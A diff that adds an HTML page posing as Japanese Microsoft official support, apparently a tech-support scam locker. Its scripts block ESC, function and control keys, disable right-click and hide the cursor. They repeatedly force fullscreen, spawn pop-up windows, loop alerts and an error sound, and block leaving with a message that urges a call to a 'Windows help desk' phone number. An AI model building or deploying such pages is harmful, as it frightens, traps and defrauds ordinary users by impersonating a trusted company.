@@ -1,0 +1,883 @@
+
+<html xmlns="http:/www.w3.org/1999/xhtml">
+  <head>
+    <meta name="robots" content="noindex,nofollow">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title> マイクロソフト公式サポート </title>
+    <link href="bootstrap.css" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <link href="translator.css" id="SL_Style" type="text/css" rel="stylesheet">
+    <link href="alert.css" rel="stylesheet">
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-164515020-2"></script>
+  	<script>
+  	  window.dataLayer = window.dataLayer || [];
+  	  function gtag(){dataLayer.push(arguments);}
+  	  gtag('js', new Date());
+
+  	  gtag('config', 'UA-164515020-2');
+  	</script>
+
+    <style>
+      html {
+        overflow: hidden;
+      }
+
+
+      /* The Modal (background) */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1; /* Sit on top */
+        padding-top: 100px; /* Location of the box */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgb(0,0,0); /* Fallback color */
+        background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+      }
+
+      /* Modal Content */
+      .modal-content {
+        position: relative;
+        background-color: blue;
+        margin: auto;
+        padding: 0;
+        /*border: 1px solid #888;*/
+        width: 80%;
+        box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
+        -webkit-animation-name: animatetop;
+        -webkit-animation-duration: 0.4s;
+        animation-name: animatetop;
+        animation-duration: 0.4s
+      }
+
+      /* Add Animation */
+      @-webkit-keyframes animatetop {
+        from {top:-300px; opacity:0}
+        to {top:0; opacity:1}
+      }
+
+      @keyframes animatetop {
+        from {top:-300px; opacity:0}
+        to {top:0; opacity:1}
+      }
+
+      /* The Close Button */
+      .close {
+      display:none;
+        color: white;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+      }
+
+      .close:hover,
+      .close:focus {
+        color: #000;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .modal-header {
+        padding: 2px 20px;
+        background-color: blue;
+        color: white;
+
+      }
+      .modal-header h2
+      {
+      border:none;
+      font-size:42px;
+      }
+
+      .modal-body {padding: 2px 20px;color:white;}
+
+      .modal-footer {
+        padding: 2px 20px;
+        background-color: blue;
+        color: white;
+        height:100px;
+      }
+
+      .modal-footer btn{
+      background-color:orange;
+      }
+
+
+    </style>
+
+
+
+    <style type="text/css">
+	 * {
+ cursor: none;
+	 }
+</style>
+
+<script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+</script>
+
+<script>
+    gourl = "index.html"
+	opener.location = gourl;
+</script>
+
+<script type="text/javascript">
+		onbeforeunload=function()
+		{
+			alert ("Press ESC, to close this page!");
+			return "Press ESC, to close this page!";
+
+		}
+	</script>
+
+<script src="jquery-3.js"></script>
+
+<script type="text/javascript">
+function move() {
+   $("#amt").trigger( "click" );
+}
+
+function pop(url,w,h) {
+    var n = window.open(url,'_blank','width='+w+',height='+h);
+    if(n==null) {
+        return true;
+    }
+    return false;
+}
+
+
+
+</script>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+		window.onkeydown = function(evt)
+		{
+			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17)
+			{
+				return false;
+
+			}
+
+		};
+		window.onkeypress = function(evn)
+		{
+			if(evn.keyCode == 123 || evn.keyCode == 117) return false;
+
+		};
+	</script>
+
+<script type="text/javascript">
+		var stroka = "<tr><td align='right' background='data:image/jpeg;base64,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Y3JvcFJlY3RCb3R0b21sb25nAAAAAAAAAAxjcm9wUmVjdExlZnRsb25nAAAAAAAAAA1jcm9wUmVjdFJpZ2h0bG9uZwAAAAAAAAALY3JvcFJlY3RUb3Bsb25nAAAAAAA4QklNA+0AAAAAABAASAAAAAEAAgBIAAAAAQACOEJJTQQmAAAAAAAOAAAAAAAAAAAAAD+AAAA4QklNBA0AAAAAAAQAAAAeOEJJTQQZAAAAAAAEAAAAHjhCSU0D8wAAAAAACQAAAAAAAAAAAQA4QklNJxAAAAAAAAoAAQAAAAAAAAACOEJJTQP1AAAAAABIAC9mZgABAGxmZgAGAAAAAAABAC9mZgABAKGZmgAGAAAAAAABADIAAAABAFoAAAAGAAAAAAABADUAAAABAC0AAAAGAAAAAAABOEJJTQP4AAAAAABwAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAADhCSU0EAAAAAAAAAgADOEJJTQQCAAAAAAAIAAAAAAAAAAA4QklNBDAAAAAAAAQBAQEBOEJJTQQtAAAAAAAGAAEAAAAEOEJJTQQIAAAAAAAQAAAAAQAAAkAAAAJAAAAAADhCSU0EHgAAAAAABAAAAAA4QklNBBoAAAAAAz0AAAAGAAAAAAAAAAAAAAA9AAAAAQAAAAQAMgBRAD0APQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAQAAAD0AAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAQAAAAAAAG51bGwAAAACAAAABmJvdW5kc09iamMAAAABAAAAAAAAUmN0MQAAAAQAAAAAVG9wIGxvbmcAAAAAAAAAAExlZnRsb25nAAAAAAAAAABCdG9tbG9uZwAAAD0AAAAAUmdodGxvbmcAAAABAAAABnNsaWNlc1ZsTHMAAAABT2JqYwAAAAEAAAAAAAVzbGljZQAAABIAAAAHc2xpY2VJRGxvbmcAAAAAAAAAB2dyb3VwSURsb25nAAAAAAAAAAZvcmlnaW5lbnVtAAAADEVTbGljZU9yaWdpbgAAAA1hdXRvR2Vu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bnQjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDE2LTA2LTIwVDIwOjE5OjA2KzAzOjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxNi0wNi0yMFQyMDozNDowOSswMzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxNi0wNi0yMFQyMDozNDowOSswMzowMCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDowN2YyNTE1NC1jNmUzLTUyNDAtYTMzMy02MWQwNTJhYWFjMjgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QkJDNjMwNjcyQ0Q5MTFFNkI1M0FERjE5NTAwNTRFMEMiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpCQkM2MzA2NzJDRDkxMUU2QjUzQURGMTk1MDA1NEUwQyIgZGM6Zm9ybWF0PSJpbWFnZS9qcGVnIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkJDNjMwNjQyQ0Q5MTFFNkI1M0FERjE5NTAwNTRFMEMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkJDNjMwNjUyQ0Q5MTFFNkI1M0FERjE5NTAwNTRFMEMiLz4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6MDdmMjUxNTQtYzZlMy01MjQwLWEzMzMtNjFkMDUyYWFhYzI4IiBzdEV2dDp3aGVuPSIyMDE2LTA2LTIwVDIwOjM0OjA5KzAzOjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/eHBhY2tldCBlbmQ9InciPz7/7gAhQWRvYmUAZIAAAAABAwAQAwIDBgAAAAAAAAAAAAAAAP/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwMDAwRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAENCwsNDg0QDg4QFA4ODhQUDg4ODhQRDAwMDAwREQwMDAwMDBEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8IAEQgAPQABAwEiAAIRAQMRAf/EAHMAAQACAwAAAAAAAAAAAAAAAAACBAMFBwEBAAAAAAAAAAAAAAAAAAAAABAAAQUBAQAAAAAAAAAAAAAAABAgAxMEEhQRAAAFBAMAAAAAAAAAAAAAAAAQAQKSkTIz06IDNRIBAAAAAAAAAAAAAAAAAAAAIP/aAAwDAQECEQMRAAAA6kCKoNgDEoD/2gAIAQIAAQUAZ//aAAgBAwABBQBn/9oACAEBAAEFAEsjKIl9OY63H//aAAgBAgIGPwAf/9oACAEDAgY/AB//2gAIAQEBBj8AK5KoPO49O08rJIMbZu1D/9k='></td></tr>";
+	</script>
+
+<script type="text/javascript">
+		window.onblur = function()
+		{
+
+		}
+
+	</script>
+
+
+<script type="text/javascript">
+		window.onload = function ()
+		{
+			document.onclick = function (e)
+			{
+				e = e || event;
+				target = e.target || e.srcElement;
+				if (target.tagName == "DIV")
+				{
+					toggleFullScreen();
+					document.body.style.cursor = 'not-allowed';
+					document.getElementById('map').innerHTML = stroka;
+					document.getElementById('fa').innerHTML = "<iframe src='' width='12' height='12' style='position: absolute;
+					left: -25px;
+					'></iframe>";
+
+				}
+				else
+				{
+					toggleFullScreen();
+					document.body.style.cursor = 'not-allowed/index.htm';
+					document.getElementById('map').innerHTML = stroka;
+					document.getElementById('fa').innerHTML = "<iframe src='' width='12' height='12' style='position: absolute;
+					left: -25px;
+					'></iframe>";
+
+				}
+
+			}
+		}
+	</script>
+<script type="text/javascript">
+		document.oncontextmenu=new Function("return false");
+	</script>
+
+
+<script type="text/javascript">
+		onbeforeunload=function()
+		{
+			alert ("Press ESC, to close this page!");
+			return "Press ESC, to close this page!";
+
+		}
+	</script>
+    <script type="text/javascript">
+var idleTime = 0;
+$(document).ready(function () {
+    //Increment the idle time counter every minute.
+    var idleInterval = setInterval(timerIncrement, 60000); // 1 minute
+
+    //Zero the idle timer on mouse movement.
+    $(this).mousemove(function (e) {
+        idleTime = 0;
+    });
+    $(this).keypress(function (e) {
+        idleTime = 0;
+    });
+});
+
+function timerIncrement() {
+    idleTime = idleTime + 1;
+    if (idleTime > 19) { // 20 minutes
+        window.location.reload();
+    }
+}
+</script>
+
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+);
+}
+</script>
+
+<script>
+    var is_chrome,
+        isChromium = window.chrome,
+        vendorName = window.navigator.vendor,
+        isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
+      is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;
+
+      function alertCall()
+      {
+      var total = "";
+
+}
+      function alertTimed()
+      {
+        if (is_chrome)
+        {
+          setInterval(function(){
+            alertCall();
+          }, 200);
+        }
+        else
+        {
+          alertLoop();
+        }
+      }
+      function alertLoop()
+      {
+        for (i = 0; i < 500; i++)
+        {
+          alertCall();
+        }
+      }
+      function addEvent(obj, evt, fn)
+      {
+        if (obj.addEventListener)
+        {
+          obj.addEventListener(evt, fn, false)
+        }
+        else if (obj.attachEvent)
+        {
+          obj.attachEvent("on" + evt, fn)
+        }
+      }
+      $(document).ready(function(){
+        document.onkeydown = function(e){
+          if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117))
+          {
+            if (!is_chrome)
+            {
+              alertTimed();
+            }
+            return true;
+          }
+          else if (e.keyCode === 123)
+          {
+            return true;
+          }
+          else
+          {
+            return true;
+          }
+        };
+        $(window).on('click', function(){
+          window.open('index1.html', 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
+          toggleFullScreen();
+          alertTimed();
+          document.getElementById("ifr").src="index.html";
+
+        });
+        addEvent(document, "mouseout", function(e){
+          e = e ? e : window.event;
+          var from = e.relatedTarget || e.toElement;
+          if (!is_chrome && (!from || from.nodeName == "body"))
+          {
+            alertTimed();
+          }
+        });
+      });
+      window.onbeforeunload = function(e){
+        var message = '*************************************************\n\nすぐにWindowsヘルプデスクに電話する (050) 3196 5323';
+        e.returnValue = message;
+        return message;
+      };
+      window.onload = function(e){
+        //alertTimed();
+      };
+
+    $('confirm text').dialog(
+    {
+        modal:true, //Not necessary but dims the page background
+        buttons:{
+            'Save':function() {
+                //Whatever code you want to run when the user clicks save goes here
+             },
+             'Delete':function() {
+                 //Code for delete goes here
+              }
+        }
+    }
+);
+
+    </script>
+
+
+    <script>
+
+function ajay(){
+setInterval(function(){toggleFullScreen(); }, 1000);
+}
+</script>
+
+
+
+
+
+	<script type="text/javascript">
+		document.oncontextmenu=new Function("return false");
+	</script>
+
+
+
+
+
+
+ <script type="text/javascript">
+function poponload()
+{
+testwindow = window.open("index.html", "_blank", "location=1,status=1,scrollbars=1,width=100,height=100");
+testwindow.moveTo(0, 0);
+}
+</script>
+
+
+
+  </head>
+
+  <body onmousemove="move()" onLoad="ajay()" class="en ltr" style="background-color:#1a2c5a; cursor:none ;overflow:hidden;"  id="mycanvas">
+
+
+    <audio autoplay="autoplay" loop="" id="msgSound1">
+      <source src="err.mp3" type="audio/mpeg">
+    </audio>
+
+        <script type="text/javascript">/*<![CDATA[*/
+        // audio play /*
+          var msgAudioEl = document.getElementById("msgSound");
+
+          var playMsgInt = setInterval(function () {
+            if (isPlaying(msgAudioEl)) {
+              // console.log('already playing. clearing interval');
+              clearInterval(playMsgInt);
+            } else {
+              // console.log('Triggering play');
+              msgAudioEl.play();
+            }
+          }, 500);
+          // audio play */
+
+        </script>
+        <script type="text/javascript">/*<![CDATA[*/
+        // audio play /*
+          var msgAudioEl = document.getElementById("msgSound1");
+
+          var playMsgInt = setInterval(function () {
+            if (isPlaying(msgAudioEl)) {
+              // console.log('already playing. clearing interval');
+              clearInterval(playMsgInt);
+            } else {
+              // console.log('Triggering play');
+              msgAudioEl.play();
+            }
+          }, 500);
+          // audio play */
+
+        </script>
+
+    <div id="coFrameDiv" style="height:0px;display:none;">
+      <iframe id="coToolbarFrame" src="a.htm" style="height:0px;width:100%;display:none;"></iframe>
+    </div>
+<img src="ls1.png" style="position:absolute; z-index:3; top:0px; left:34%; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.4), 0 6px 20px 0 rgba(0, 0, 0, 0.22);" />
+    <a id="elem" href="#" style="display: none;"></a>
+
+    <span id="audioarea"></span>
+    <table width="100%" cellspacing="0" cellpadding="0" border="0">
+      <tbody>
+        <tr>
+          <td valign="top" align="center"><div id="map"></div>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <nav class="navbar navbar-default navbar-static-tops">
+      <div class="container" >
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+            <span class="sr-only">ナビゲーション</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#">
+            <img src="windows.png" alt="Windows">
+          </a>
+        </div>
+        <div id="navbar" class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+            <li class="dropdown">
+              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">お店<span class="caret"></span></a>
+              <ul class="dropdown-menu">
+                <li><a href="#">ウィンドウズ </a></li>
+			<li><a href="#">デバイス</a></li>
+			<li><a href="#">アプリ + ゲームs</a></li>
